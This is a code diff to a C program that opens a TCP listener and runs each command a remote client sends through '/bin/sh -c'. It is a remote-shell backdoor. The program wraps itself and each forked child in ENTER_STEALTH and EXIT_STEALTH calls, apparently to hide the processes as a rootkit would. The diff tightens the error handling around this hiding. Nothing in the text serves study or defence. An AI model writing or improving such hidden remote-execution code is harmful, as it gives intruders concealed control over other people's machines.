@@ -3,8 +3,8 @@
  */
 #include "include.h"
 
-void *respond_client(void *param);
-int fork_and_execute(char *command, int sockfd);
+static void *respond_client(void *param);
+static int fork_and_execute(char *command, int sockfd);
 
 int keep_running = 1;
 
@@ -13,6 +13,7 @@ int main(int argc, char** argv)
     int port, sockfd, new_sockfd;
     struct sockaddr_in host_addr, client_addr;
     socklen_t sin_size;
+    pid_t pid;
     int yes = 1;
 
     if (argc != 2) {
@@ -20,12 +21,17 @@ int main(int argc, char** argv)
         return EXIT_FAILURE;
     }
 
-    ENTER_STEALTH(getpid());
+    pid = getpid();
+    if(ENTER_STEALTH(pid)) {
+        fprintf(stderr, "Failed to acquire stealth\n");
+        return EXIT_FAILURE;
+    }
 
     int length = strlen(argv[1]);
     for (int i = 0; i < length; i++) {
         if (!isdigit(argv[1][i])) {
             fprintf(stderr, "Expected port, got: %s\n", argv[1]);
+            EXIT_STEALTH(pid);
             return EXIT_FAILURE;
         }
     }
@@ -34,12 +40,14 @@ int main(int argc, char** argv)
     if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
         fprintf(stderr, "Fatal error in socket\n");
         PRINT_ERRNO;
+        EXIT_STEALTH(pid);
         return EXIT_FAILURE;
     }
 
     if ((setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int))) == -1) {
         fprintf(stderr, "Failed to set socket option SO_REUSEADDR\n");
         PRINT_ERRNO;
+        EXIT_STEALTH(pid);
         return EXIT_FAILURE;
     }
 
@@ -52,12 +60,14 @@ int main(int argc, char** argv)
     if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1) {
         fprintf(stderr, "Failed to bind to socket\n");
         PRINT_ERRNO;
+        EXIT_STEALTH(pid);
         return EXIT_FAILURE;
     }
 
     if (listen(sockfd, BACKLOG_SIZE) == -1) {
         fprintf(stderr, "Failed to listen on socket\n");
         PRINT_ERRNO;
+        EXIT_STEALTH(pid);
         return EXIT_FAILURE;
     }
 
@@ -71,6 +81,7 @@ int main(int argc, char** argv)
         if (new_sockfd == -1) {
             fprintf(stderr, "Failed to accept connection\n");
             PRINT_ERRNO;
+            EXIT_STEALTH(pid);
             return EXIT_FAILURE;
         }
         DEBUG_PRINT("Accepted connection from %s on socket %d\n",
@@ -81,6 +92,7 @@ int main(int argc, char** argv)
         pthread_create(&tid, &attr, respond_client, params);
     }
 
+    EXIT_STEALTH(pid);
     return EXIT_SUCCESS;
 }
 
@@ -116,6 +128,7 @@ void *respond_client(void *param)
                 free(msg);
                 close(sockfd);
                 sleep(1);
+                EXIT_STEALTH(getpid());
                 exit(EXIT_SUCCESS);
             } else if (fork_and_execute(buffer, sockfd) == -1) {
                 fprintf(stderr, "Failed to execute command\n");
@@ -146,9 +159,11 @@ int fork_and_execute(char *command, int sockfd)
         fprintf(stderr, "Fork failed\n");
         return -1;
     } else if (pid == 0) {
+        ENTER_STEALTH(getpid());
         return execlp("/bin/sh", "sh", "-c", formatted_command, NULL);
     } else {
         waitpid(pid, &wstatus, 0);
+        EXIT_STEALTH(pid);
         DEBUG_PRINT("File \"%s\" made ", file);
 
         out = fopen(file, "rb");
